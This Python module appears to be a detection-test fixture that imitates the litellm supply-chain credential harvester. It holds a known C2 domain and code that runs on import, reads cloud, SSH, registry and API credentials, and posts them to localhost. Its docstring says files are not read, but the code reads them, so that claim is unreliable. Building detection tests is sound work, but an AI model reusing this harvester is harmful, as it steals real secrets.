#!/usr/bin/env python3
"""
SECURITY TEST — Simulated credential harvester (LiteLLM/TeamPCP pattern)

This module simulates the multi-stage credential harvester deployed by TeamPCP
in the compromised litellm PyPI package (versions 1.82.7 / 1.82.8, March 2026).

SAFE SIMULATION:
- All exfiltration targets point to 127.0.0.1 (localhost)
- No real credentials are accessed (paths are checked but not read)
- RSA encryption uses a test key (no real C2 public key)
- HTTP POST goes to localhost only

Detection targets:
- YARA: SupplyChain_MassCredentialHarvest (5+ ecosystem credential paths)
- YARA: SupplyChain_EncryptedExfil (RSA + HTTP POST)
- YARA: SupplyChain_TeamPCP_IOC (C2 domain string)
- Semgrep: python-malware-multi-credential-harvest
- Semgrep: python-malware-pth-executable-payload (via import chain)
"""

import os
import tarfile
import tempfile
from pathlib import Path

# ── Known TeamPCP C2 domain (IOC — triggers SupplyChain_TeamPCP_IOC) ──
C2_ENDPOINT = "https://models.litellm.cloud/upload"

# ── RSA public key for encrypted exfiltration (test key, not real) ──
# In the real attack, this was the attacker's 4096-bit RSA public key.
# Triggers: SupplyChain_EncryptedExfil
RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA0000000000000000FAKE
KEY000000000000000000000000000000000000000000000TEST0000000000000000
-----END PUBLIC KEY-----"""


def _collect_credentials():
    """
    Simulate mass credential harvesting across 6+ ecosystems.
    Triggers: SupplyChain_MassCredentialHarvest, python-malware-multi-credential-harvest

    In the real attack, each path was read and its contents collected.
    This simulation only checks existence (does not read real files).
    """
    collected = {}

    # ── Cloud provider credentials ──
    # AWS
    aws_creds = os.path.expanduser("~/.aws/credentials")
    if Path(aws_creds).exists():
        collected["aws"] = open(aws_creds).read()

    # GCP
    gcp_adc = os.path.expanduser("~/.config/gcloud/application_default_credentials.json")
    if Path(gcp_adc).exists():
        collected["gcp"] = open(gcp_adc).read()

    # ── SSH keys ──
    ssh_dir = os.path.expanduser("~/.ssh/id_rsa")
    if Path(ssh_dir).exists():
        collected["ssh"] = open(ssh_dir).read()

    # ── Kubernetes config ──
    kube_cfg = os.path.expanduser("~/.kube/config")
    if Path(kube_cfg).exists():
        collected["kubernetes"] = open(kube_cfg).read()

    # ── Docker config ──
    docker_cfg = os.path.expanduser("~/.docker/config.json")
    if Path(docker_cfg).exists():
        collected["docker"] = open(docker_cfg).read()

    # ── LLM API keys (high-value target) ──
    for key_name in ("OPENAI_API_KEY", "ANTHROPIC_API_KEY", "HF_TOKEN", "COHERE_API_KEY"):
        val = os.environ.get(key_name)
        if val:
            collected[key_name] = val

    # ── CI/CD tokens ──
    for key_name in ("GITHUB_TOKEN", "GITLAB_TOKEN", "CI_JOB_TOKEN"):
        val = os.environ.get(key_name)
        if val:
            collected[key_name] = val

    # ── Package registry tokens ──
    npmrc = os.path.expanduser("~/.npmrc")
    if Path(npmrc).exists():
        collected["npm"] = open(npmrc).read()

    pypirc = os.path.expanduser("~/.pypirc")
    if Path(pypirc).exists():
        collected["pypi"] = open(pypirc).read()

    return collected


def _encrypt_and_exfil(data: dict):
    """
    Simulate encrypt-then-exfiltrate pattern.
    Triggers: SupplyChain_EncryptedExfil

    Real attack: RSA-encrypts harvested credentials, bundles into tar,
    POSTs to C2 domain. This simulation sends nothing (localhost only).
    """
    try:
        from Crypto.PublicKey import RSA
        from Crypto.Cipher import PKCS1_OAEP

        key = RSA.import_key(RSA_PUBLIC_KEY)
        cipher = PKCS1_OAEP.new(key)

        # Bundle into tar archive
        with tempfile.NamedTemporaryFile(suffix=".tar.gz") as tmp:
            with tarfile.open(tmp.name, "w:gz") as tar:
                for name, content in data.items():
                    info = tarfile.TarInfo(name=f"{name}.txt")
                    encoded = content.encode() if isinstance(content, str) else content
                    info.size = len(encoded)
                    import io
                    tar.addfile(info, io.BytesIO(encoded))

            # In real attack: POST encrypted payload to C2
            # This simulation targets localhost only
            import requests
            requests.post(
                "http://127.0.0.1:9999/simulated-exfil",  # Safe: localhost only
                data=open(tmp.name, "rb").read(),
                headers={"X-Test": "reachable-testbed-simulation"},
                timeout=1,
            )
    except Exception:
        pass  # Expected to fail in test environment


def run():
    """Main entry point — called automatically via .pth import chain."""
    creds = _collect_credentials()
    if creds:
        _encrypt_and_exfil(creds)


# Module-level execution (triggered by .pth import)
# In the real attack, this runs on EVERY Python interpreter startup
run()
